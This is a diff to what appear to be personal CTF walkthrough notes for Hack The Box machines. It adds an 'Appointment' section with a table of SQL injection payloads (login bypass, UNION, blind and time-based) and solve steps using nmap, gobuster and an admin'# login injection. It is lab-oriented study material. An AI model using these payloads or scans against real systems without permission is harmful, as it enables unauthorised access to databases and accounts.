@@ -231,11 +231,56 @@ _$~ rsync [options] rsync://IP_or_Hostname/module/_
 3. rsync -P rsync://10.10.10.10/public/flag.txt . (This will download "flag.txt" to your current directory.)
 4. Done
 
-
 ## 9. Appointment
+- SQL (Structured Query Language) is a standard language used to manage and manipulate relational databases by performing tasks like querying data, updating records, or deleting tables.
+- SQL Injection (SQLi) is a vulnerability that allows an attacker to interfere with the queries an application makes to its database. It can be used to bypass login, extract data, or even modify the database.
+
+### Common SQL Commands
+
+| Command     | Description                                      | Example                            |
+|:------------|:--------------------------------------------------|:-----------------------------------|
+| SELECT      | Retrieve data from one or more tables             | SELECT * FROM users;               |
+| INSERT      | Add new data into a table                         | INSERT INTO users VALUES (...);    |
+| UPDATE      | Modify existing data in a table                   | UPDATE users SET name='Joe';       |
+| DELETE      | Remove data from a table                          | DELETE FROM users WHERE id=1;      |
+| CREATE      | Create a new table or database                    | CREATE TABLE users (...);          |
+| DROP        | Delete a table or database                        | DROP TABLE users;                  |
+
+### Common SQL Injection Payloads
+
+| Payload                         | Purpose                                      | Description                        |
+|:--------------------------------|:---------------------------------------------|:-----------------------------------|
+| ' OR 1=1 --                    | Bypass login                                | Always true, skips password check |
+| admin' --                      | Login as admin without password              | Comments out the rest             |
+| ' UNION SELECT null,null --   | Test for UNION-based injection               | Combines multiple SELECTs         |
+| ' AND 1=2 --                   | False condition for testing filtering        | Useful for confirming injection   |
+| ' ORDER BY 1 --                | Check number of columns                      | Used to trigger errors            |
+| ' OR 'a'='a' --                | Classic tautology                            | Always true                       |
+| ' OR 1=1 #                         | Bypass login                                | Always true, comments out rest       |
+| admin' #                           | Login as admin without password              | Comments out password clause         |
+| ' UNION SELECT null,null #        | Test for UNION-based injection               | Checks for compatible column count   |
+| ' AND 1=2 #                        | False condition for testing filtering        | Used to trigger no results           |
+| ' ORDER BY 1 #                     | Check number of columns                      | Triggers error if column doesn't exist |
+| ' OR 'a'='a' #                     | Classic tautology                            | Always true                          |
+| ' OR 1=1 LIMIT 1 #                | Selects only one result                      | Avoids long output                   |
+| ' AND ASCII(SUBSTRING(user(),1,1))=114 # | Blind SQLi payload                      | Extracts info character by character |
+| 1' AND SLEEP(5) #                 | Time-based Blind SQLi                        | Detects injection via response delay |
+
+
+
+### How to solve CTF
+1. Scan for open ports --> _$~nmap -sV -O -Pn -n -p- -T5 TargetIP_
+2. Notice port 80 http is open.
+3. Check for web application
+4. Perfom directory busting --> _$~gobuster dir -u http://IP_ADDRESS/ -w /usr/share/wordlists/dirb/common.txt
+5. Conduct SQL injection on login form --> _admin'#_
+6. Done
+
+
+
+
 
 * * *
-
 ## 10. Squel
 ## 11. Crocodile
 ## 12. Responder
